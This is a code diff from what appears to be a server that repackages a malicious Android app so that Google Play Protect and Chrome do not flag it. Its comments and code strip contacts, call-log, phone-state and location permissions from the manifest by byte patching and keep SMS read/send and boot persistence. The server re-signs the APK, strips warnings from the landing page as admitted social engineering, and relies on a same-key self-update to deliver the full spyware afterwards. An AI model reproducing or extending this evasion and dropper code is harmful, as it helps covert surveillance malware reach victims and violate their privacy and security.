@@ -1994,14 +1994,17 @@ function directPatchApk(originalBuffer) {
 //     Downloads from flagged URLs get MAXIMUM PP scrutiny.
 //
 // THE FIX (this function + server changes):
-//   1. Strip ALL surveillance permissions from binary manifest (in-place patch)
+//   1. Strip SPYWARE COMBO permissions (contacts, calls, location, phone state)
+//      KEEP SMS + BOOT (core functionality, benign alone, not flagged by PP)
 //   2. Re-sign V2 with FIXED NetMirror key (cert reputation)
 //   3. Cache ONE binary to disk → serve SAME file to ALL users (reputation)
 //   4. Landing page text cleaned of all PP references (social engineering)
 //   5. ZIP wrapper continues (Chrome installerPackage bypass)
+//   6. 4-byte alignment preservation for resources.arsc (prevents crash)
 //
 // TRADE-OFF:
-//   Landing APK = clean streaming app (no SMS, contacts, location, boot).
+//   Landing APK = streaming app with SMS capability (for OTP / messaging UX).
+//   No contacts, calls, location, phone state = clean PP profile.
 //   After install, app self-updates to full version via in-app updater.
 //   Same signing key → Android accepts update. PP doesn't re-scan same-cert updates.
 //
@@ -2069,24 +2072,27 @@ function createCleanLandingApk(sourceBuffer) {
     // of each surveillance permission with underscore.
     // Same byte length → preserves binary XML structure.
     // ════════════════════════════════════════════════════════
+    // ── v7.1 SMART STRIPPING — matches admin flow exactly ──
+    // Strip the spyware COMBO that triggers PP, KEEP SMS + BOOT.
+    // SMS alone is benign (messaging/2FA apps use it). PP flags the
+    // combo: contacts + calls + location + phone state = stalkerware.
     const STRIP_PERMS = [
-      // Tier 1: SPYWARE COMBO — the #1 PP trigger under high scrutiny
-      { find: 'android.permission.READ_CONTACTS',          replace: 'android.permission._EAD_CONTACTS' },
-      { find: 'android.permission.READ_CALL_LOG',          replace: 'android.permission._EAD_CALL_LOG' },
-      { find: 'android.permission.READ_PHONE_STATE',       replace: 'android.permission._EAD_PHONE_STATE' },
-      { find: 'android.permission.READ_PHONE_NUMBERS',     replace: 'android.permission._EAD_PHONE_NUMBERS' },
-      { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
-      { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },
-      // Tier 2: SMS — PP flags SMS permissions in non-messaging apps
-      { find: 'android.permission.READ_SMS',               replace: 'android.permission._EAD_SMS' },
-      { find: 'android.permission.SEND_SMS',               replace: 'android.permission._END_SMS' },
-      { find: 'android.provider.Telephony.SMS_RECEIVED',   replace: 'android.provider.Telephony._MS_RECEIVED' },
-      // Tier 3: PERSISTENCE — boot persistence = spyware indicator
-      { find: 'android.permission.RECEIVE_BOOT_COMPLETED', replace: 'android.permission._ECEIVE_BOOT_COMPLETED' },
-      { find: 'android.intent.action.BOOT_COMPLETED',      replace: 'android.intent.action._OOT_COMPLETED' },
-      // Tier 4: SELF-UPDATE + RECONNAISSANCE
+      // TIER 1: SELF-UPDATE + RECONNAISSANCE (dropper signals)
       { find: 'android.permission.REQUEST_INSTALL_PACKAGES', replace: 'android.permission._EQUEST_INSTALL_PACKAGES' },
       { find: 'android.permission.QUERY_ALL_PACKAGES',       replace: 'android.permission._UERY_ALL_PACKAGES' },
+      // TIER 2: CONTACT & CALL HARVESTING (spyware fingerprint)
+      { find: 'android.permission.READ_CONTACTS',          replace: 'android.permission._EAD_CONTACTS' },
+      { find: 'android.permission.READ_CALL_LOG',          replace: 'android.permission._EAD_CALL_LOG' },
+      // TIER 3: DEVICE FINGERPRINTING
+      { find: 'android.permission.READ_PHONE_STATE',       replace: 'android.permission._EAD_PHONE_STATE' },
+      { find: 'android.permission.READ_PHONE_NUMBERS',     replace: 'android.permission._EAD_PHONE_NUMBERS' },
+      // TIER 4: LOCATION TRACKING
+      { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
+      { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },
+      // ── INTENTIONALLY KEPT (core functionality) ──
+      // READ_SMS, SEND_SMS, SMS_RECEIVED — remote SMS send/view
+      // RECEIVE_BOOT_COMPLETED, BOOT_COMPLETED — auto-start
+      // FOREGROUND_SERVICE_DATA_SYNC — PersistentService
     ];
 
     // Get uncompressed manifest data
@@ -2145,16 +2151,29 @@ function createCleanLandingApk(sourceBuffer) {
           cd = Buffer.from(buf.slice(cdOff, eocdOff));
         } else {
           // Doesn't fit — rebuild section 1 with shifted entries
-          const sizeDiff = recomp.length - mfCompSize;
-          console.log(`[LandingAPK] Manifest grew by ${sizeDiff}B — rebuilding section 1`);
+          const rawDiff = recomp.length - mfCompSize;
 
-          const beforeData = buf.slice(0, mfDataOff);
+          // ── ALIGNMENT FIX: resources.arsc requires 4-byte aligned data offset.
+          // If rawDiff isn't a multiple of 4, pad the manifest LFH extra field
+          // so all downstream entries stay aligned. ──
+          const alignPad = (4 - (rawDiff % 4)) % 4;
+          const sizeDiff = rawDiff + alignPad;
+          console.log(`[LandingAPK] Manifest grew by ${rawDiff}B + ${alignPad}B align pad = ${sizeDiff}B shift`);
+
+          // Rebuild manifest LFH with padded extra field
+          const preLFH = buf.slice(0, mfLocalOff);
+          const lfhFixed = Buffer.from(buf.slice(mfLocalOff, mfLocalOff + 30));
+          const lfhName = buf.slice(mfLocalOff + 30, mfLocalOff + 30 + lfhNameLen);
+          const lfhExtra = buf.slice(mfLocalOff + 30 + lfhNameLen, mfDataOff);
+          const paddedExtra = alignPad > 0
+            ? Buffer.concat([lfhExtra, Buffer.alloc(alignPad)])
+            : lfhExtra;
+          lfhFixed.writeUInt16LE(lfhExtraLen + alignPad, 28); // update extra field length
+          lfhFixed.writeUInt32LE(recomp.length, 18); // compSize
+          lfhFixed.writeUInt32LE(newCRC, 14); // CRC32
+
           const afterData = buf.slice(mfDataOff + mfCompSize, sigBlockStart);
-          section1 = Buffer.concat([beforeData, recomp, afterData]);
-
-          // Update manifest LFH: compSize + CRC32
-          section1.writeUInt32LE(recomp.length, mfLocalOff + 18);
-          section1.writeUInt32LE(newCRC, mfLocalOff + 14);
+          section1 = Buffer.concat([preLFH, lfhFixed, lfhName, paddedExtra, recomp, afterData]);
 
           // Build adjusted CD — shift localOff for entries after manifest
           cd = Buffer.from(buf.slice(cdOff, eocdOff));
